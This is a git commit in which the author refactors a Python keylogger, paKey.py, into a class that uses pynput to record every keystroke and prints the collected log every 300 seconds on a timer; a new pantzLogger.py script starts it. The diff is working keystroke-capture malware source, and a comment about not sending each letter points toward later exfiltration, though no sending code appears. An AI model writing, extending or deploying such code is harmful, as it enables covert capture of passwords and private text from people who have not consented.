d4ff551af8340d8363513d94b7188ec2355996ac
Anastasios <apantzar@csd.auth.gr>
2021-03-11 16:06:35 +0200

    new class added, timer added, logging works better now.

--- paKey.py
+++ paKey.py
@@ -1,25 +1,36 @@
 #!/usr/bin/env python
 import pynput.keyboard
+import threading
 
 # global log variable in order not to send each letter
 log = ""
 
 
-# process to catch keystrokes
+class PaKey:
 
-def process_key_press(key):
-    global log
-    try:
-        log = log + str(key.char)
-    except AttributeError:
-        if key == key.space:
-            log = log + " "
-        else:
-            log = log + " "+str(key)+" "
+    # process to catch keystrokes
 
-    print(log)
+    def process_key_press(self, key):
+        global log
+        try:
+            log = log + str(key.char)
+        except AttributeError:
+            if key == key.space:
+                log = log + " "
+            else:
+                log = log + " " + str(key) + " "
 
+    def reporter(self):
+        global log
+        print(log)
+        log = ""
+        timer = threading.Timer(300, self.reporter)  # timer to count sec and internal call reporter for new
+        timer.start()
 
-keyboardListener = pynput.keyboard.Listener(on_press=process_key_press)
-with keyboardListener:
-    keyboardListener.join()
+    def start(self):
+        # in order to listen keystrokes from the keyboard
+
+        keyboardListener = pynput.keyboard.Listener(on_press=self.process_key_press)
+        with keyboardListener:
+            self.reporter()
+            keyboardListener.join()
---
+++ pantzLogger.py
@@ -0,0 +1,6 @@
+#!/usr/bin/env python
+import paKey
+
+my_logger = paKey.PaKey()
+my_logger.start()
+
